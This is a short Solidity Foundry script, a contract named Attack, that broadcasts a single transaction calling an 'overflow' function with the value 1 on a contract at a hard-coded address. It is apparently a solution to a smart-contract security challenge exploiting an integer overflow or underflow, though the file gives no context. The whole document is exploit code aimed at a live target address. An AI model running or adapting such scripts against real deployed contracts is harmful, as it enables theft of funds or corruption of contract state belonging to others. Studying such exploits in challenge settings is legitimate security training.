// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface ITarget {
    function overflow(uint256 money) external;
}

contract Attack is Script {
    ITarget public target = ITarget(0x86dE755fD893C3BadB22a08dEb4fe5353F8023d9);

    function run() external {
        vm.startBroadcast();
        target.overflow(1);
        vm.stopBroadcast();
    }
}
